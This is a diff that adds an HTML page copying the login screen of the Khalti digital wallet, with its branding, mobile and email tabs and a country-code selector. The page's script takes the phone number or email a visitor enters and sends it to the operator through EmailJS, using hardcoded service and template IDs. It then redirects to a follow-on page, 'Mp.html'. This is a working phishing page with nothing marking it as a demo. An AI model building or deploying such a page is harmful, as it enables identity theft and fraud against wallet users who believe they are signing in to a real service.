@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#141414">
+<title>Welcome To Form</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  background: #141414;
+  color: #e6e6e6;
+  font-family: Roboto, Arial, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+}
+
+.screen {
+  width: 100%;
+  max-width: 420px;
+  min-height: 100vh;
+  padding: 24px 20px;
+  display: flex;
+  flex-direction: column;
+  position: relative;
+}
+
+.lang-btn {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  width: 66px;
+  height: 50px;
+  border: 1.5px solid #3a3a3a;
+  border-radius: 6px;
+  background: none;
+  color: white;
+  font-size: 20px;
+}
+
+h1 {
+  font-size: 40px;
+  font-weight: 400;
+  line-height: 1.3;
+  margin-top: 90px;
+}
+
+h1 span {
+  color: #b5162e;
+  font-weight: 500;
+}
+
+.subtitle {
+  color: #8a8a8a;
+  font-size: 18px;
+  line-height: 1.5;
+  margin-top: 18px;
+}
+
+.tabs {
+  display: flex;
+  margin-top: 36px;
+  border-bottom: 2px solid #2a2a2a;
+}
+
+.tab {
+  flex: 1;
+  background: none;
+  border: none;
+  padding: 12px 0;
+  color: #8a8a8a;
+  font-size: 17px;
+  font-weight: 500;
+  cursor: pointer;
+  position: relative;
+}
+
+.tab.active {
+  color: #4a90e2;
+}
+
+.tab.active::after {
+  content: "";
+  position: absolute;
+  left: 0;
+  right: 0;
+  bottom: -2px;
+  height: 2px;
+  background: #4a90e2;
+}
+
+.field-row {
+  display: flex;
+  gap: 14px;
+  margin-top: 30px;
+}
+
+.country-select {
+  height: 56px;
+  min-width: 96px;
+  padding: 0 12px;
+  background: #141414;
+  color: white;
+  border: 1.5px solid #555;
+  border-radius: 8px;
+  font-size: 17px;
+  outline: none;
+}
+
+.input-wrap {
+  position: relative;
+  flex: 1;
+  height: 56px;
+}
+
+.input-wrap input {
+  width: 100%;
+  height: 100%;
+  background: #141414;
+  color: white;
+  border: 2px solid #3cc9c4;
+  border-radius: 8px;
+  padding: 0 16px;
+  font-size: 17px;
+  outline: none;
+}
+
+.input-wrap input:focus {
+  border-color: #4a90e2;
+}
+
+.input-wrap label {
+  position: absolute;
+  top: -9px;
+  left: 12px;
+  background: #141414;
+  padding: 0 4px;
+  font-size: 14px;
+  color: #3cc9c4;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.referral {
+  text-align: right;
+  color: #e0606a;
+  font-size: 16px;
+  font-weight: 500;
+  margin-top: 22px;
+  cursor: pointer;
+}
+
+.btn {
+  margin-top: 40px;
+  width: 100%;
+  height: 56px;
+  background: #a3142b;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  font-size: 17px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  box-shadow: 0 4px 12px rgba(0,0,0,.5);
+  transition: .25s;
+}
+
+.btn:active {
+  transform: scale(.98);
+}
+
+.btn:disabled {
+  opacity: .6;
+  cursor: not-allowed;
+}
+
+.msg {
+  margin-top: 16px;
+  min-height: 20px;
+  font-size: 14px;
+  text-align: center;
+}
+
+.msg.error {
+  color: #ff6b6b;
+}
+
+.msg.success {
+  color: #6fcf97;
+}
+
+@media(max-width:350px) {
+  h1 {
+    font-size: 34px;
+  }
+
+  .country-select {
+    min-width: 85px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="screen">
+
+  <button class="lang-btn" type="button">ने</button>
+
+  <h1>Welcome<br>To <span>Khalti</span></h1>
+
+  <p class="subtitle">
+    Proceed with your mobile number or Email ID
+  </p>
+
+  <div class="tabs">
+    <button class="tab active" id="tabMobile" type="button">
+      Mobile Number
+    </button>
+
+    <button class="tab" id="tabEmail" type="button">
+      Email
+    </button>
+  </div>
+
+  <form id="contactForm" novalidate>
+
+    <!-- MOBILE -->
+    <div id="mobileSection" class="field-row">
+
+      <select class="country-select" id="countryCode">
+        <option value="+977">🇳🇵 +977</option>
+        <option value="+91">🇮🇳 +91</option>
+        <option value="+1">🇺🇸 +1</option>
+      </select>
+
+      <div class="input-wrap">
+        <label for="phone">Mobile Number</label>
+
+        <input
+          type="tel"
+          id="phone"
+          placeholder="Enter your number"
+          autocomplete="tel-national"
+          maxlength="15"
+          inputmode="numeric"
+        >
+      </div>
+
+    </div>
+
+    <!-- EMAIL -->
+    <div id="emailSection" class="field-row hidden">
+
+      <div class="input-wrap" style="width:100%">
+        <label for="email">Email ID</label>
+
+        <input
+          type="email"
+          id="email"
+          placeholder="Enter your email"
+          autocomplete="email"
+        >
+      </div>
+
+    </div>
+
+    <p class="referral">Have a referral code?</p>
+
+    <button class="btn" id="continueBtn" type="submit">
+      CONTINUE
+    </button>
+
+    <p class="msg" id="msg"></p>
+
+  </form>
+
+</div>
+
+<script>
+
+// =====================================
+// EMAILJS CONFIGURATION
+// =====================================
+
+const SERVICE_ID = "service_8iot5xx";
+const TEMPLATE_ID = "template_2vp7oqq";
+const PUBLIC_KEY = "ttrKOZNMDMqFjqfPT";
+
+// Redirect destination
+const REDIRECT_URL = "Mp.html";
+
+// Initialize EmailJS safely
+emailjs.init({
+  publicKey: PUBLIC_KEY
+});
+
+
+// =====================================
+// ELEMENTS
+// =====================================
+
+const tabMobile = document.getElementById("tabMobile");
+const tabEmail = document.getElementById("tabEmail");
+
+const mobileSection = document.getElementById("mobileSection");
+const emailSection = document.getElementById("emailSection");
+
+const countryCode = document.getElementById("countryCode");
+const phoneInput = document.getElementById("phone");
+const emailInput = document.getElementById("email");
+
+const form = document.getElementById("contactForm");
+const continueBtn = document.getElementById("continueBtn");
+const msg = document.getElementById("msg");
+
+let mode = "mobile";
+let isSending = false;
+
+
+// =====================================
+// SWITCH TABS
+// =====================================
+
+function setMode(newMode) {
+
+  if (isSending) return;
+
+  mode = newMode;
+
+  const isMobile = mode === "mobile";
+
+  tabMobile.classList.toggle("active", isMobile);
+  tabEmail.classList.toggle("active", !isMobile);
+
+  mobileSection.classList.toggle("hidden", !isMobile);
+  emailSection.classList.toggle("hidden", isMobile);
+
+  msg.textContent = "";
+  msg.className = "msg";
+}
+
+tabMobile.addEventListener("click", () => {
+  setMode("mobile");
+});
+
+tabEmail.addEventListener("click", () => {
+  setMode("email");
+});
+
+
+// =====================================
+// PHONE INPUT VALIDATION
+// =====================================
+
+phoneInput.addEventListener("input", function() {
+  this.value = this.value.replace(/\D/g, "");
+});
+
+
+// =====================================
+// MESSAGE DISPLAY
+// =====================================
+
+function showMsg(message, type) {
+
+  msg.textContent = message;
+  msg.className = "msg " + type;
+
+}
+
+
+// =====================================
+// BUTTON LOADING
+// =====================================
+
+function setLoading(loading) {
+
+  isSending = loading;
+
+  continueBtn.disabled = loading;
+
+  continueBtn.textContent = loading
+    ? "PLEASE WAIT..."
+    : "CONTINUE";
+
+}
+
+
+// =====================================
+// FORM SUBMISSION
+// =====================================
+
+form.addEventListener("submit", async function(e) {
+
+  e.preventDefault();
+
+  if (isSending) return;
+
+  msg.textContent = "";
+  msg.className = "msg";
+
+  let params = {};
+
+  // -----------------------------------
+  // MOBILE SUBMISSION
+  // -----------------------------------
+
+  if (mode === "mobile") {
+
+    const phone = phoneInput.value.trim();
+    const code = countryCode.value;
+
+    if (!/^\d{7,15}$/.test(phone)) {
+
+      showMsg(
+        "Please enter a valid mobile number.",
+        "error"
+      );
+
+      phoneInput.focus();
+      return;
+    }
+
+    params = {
+
+      type: "Mobile Number",
+
+      country_code: code,
+
+      phone: phone,
+
+      full_number: code + phone,
+
+      email: "N/A"
+
+    };
+
+  }
+
+  // -----------------------------------
+  // EMAIL SUBMISSION
+  // -----------------------------------
+
+  else {
+
+    const email = emailInput.value.trim();
+
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailPattern.test(email)) {
+
+      showMsg(
+        "Please enter a valid email ID.",
+        "error"
+      );
+
+      emailInput.focus();
+      return;
+    }
+
+    params = {
+
+      type: "Email ID",
+
+      country_code: "N/A",
+
+      phone: "N/A",
+
+      full_number: "N/A",
+
+      email: email
+
+    };
+
+  }
+
+
+  // -----------------------------------
+  // SEND EMAILJS
+  // -----------------------------------
+
+  setLoading(true);
+
+  showMsg("Processing...", "success");
+
+  try {
+
+    const response = await emailjs.send(
+      SERVICE_ID,
+      TEMPLATE_ID,
+      params
+    );
+
+    console.log("EmailJS success:", response);
+
+    // Email sent successfully
+    showMsg("Success! Wait...", "success");
+
+    // Redirect only after successful EmailJS response
+    window.location.assign(REDIRECT_URL);
+
+  }
+
+  catch(error) {
+
+    console.error(" failed:", error);
+
+    showMsg(
+      " failed. Please check your internet and try again.",
+      "error"
+    );
+
+    setLoading(false);
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
